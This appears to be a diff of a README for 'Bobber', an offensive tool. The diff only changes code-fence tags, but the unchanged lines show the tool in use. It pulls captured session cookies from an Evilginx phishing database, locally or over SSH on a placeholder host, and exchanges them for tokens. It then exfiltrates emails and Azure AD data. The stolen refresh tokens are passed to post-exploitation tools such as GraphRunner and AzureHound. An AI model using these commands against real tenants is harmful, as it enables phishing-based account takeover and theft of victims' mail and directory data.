@@ -94,17 +94,17 @@ RoadTools Options:
 # Example Usage
 
 Monitor a remote file for changes via SSH, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has exchange captured cookie for JWT tokens, and exfiltrate only AAD Users and Groups data from the Graph API
-```
+```powershell
 python Bobber.py "/root/.evilginx/data.db" --username root --host 1337.66.69.420 --keep-open --aad
 ```
 
 Monitor a local file for changes, exchange captured cookie for JWT token, and exfiltrate only emails.
-```
+```powershell
 python Bobber.py evilginx_data.db --host 1337.66.69.420  --owa 
 ```
 
 Monitor a remote file for changes over SSH. authenticate using username and password, exchange captured cookie for JWT tokens, and exfiltrate all data available.
-```
+```powershell
 python Bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --all
 ```
 
@@ -115,7 +115,7 @@ When Bobber captures a complete Evilginx session, then tokens retrieved using Ro
 ### AADInternals
 [AADInternals](https://aadinternals.com/aadinternals/#introduction) is an Modular powershell-framework for exploring the pathways your access might have, created by my favorite finnish person [@DrAzureAD](https://twitter.com/DrAzureAD)
 
-```
+```powershell
 #Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
@@ -135,7 +135,7 @@ $msAzJWT =Get-AADIntAccessTokenWithRefreshToken -ClientId "1950a258-227b-4e31-a9
 ### AzureHound
 [AzureHound](https://github.com/BloodHoundAD/AzureHound) is an BloodHound data collector for Microsoft Azure, from the great people over at [@SpecterOps](https://twitter.com/SpecterOps)
 
-```
+```powershell
 #Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
@@ -145,7 +145,7 @@ azurehound.exe -r $roadToolsAuth.refreshToken -t $roadToolsAuth.tenantId list -o
 
 ### GraphRunner
 [GraphRunner](https://github.com/dafthack/GraphRunner) Powershell based post-exploitation toolset for interacting with the Microsoft Graph API, by [@dafthack](https://twitter.com/dafthack)
-```
+```powershell
 #Import GraphRunner
 Import-Module .\GraphRunner.ps1
 
@@ -163,7 +163,7 @@ Invoke-GraphRunner -Tokens $tokens
 
 ### Power-Pwn
 [Power-Pwn](https://github.com/mbrg/power-pwn) in Python based offensive security toolset for targeting the Microsoft 365 Power Platform, by [@mbrg0](https://twitter.com/mbrg0)
-```
+```powershell
 #Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
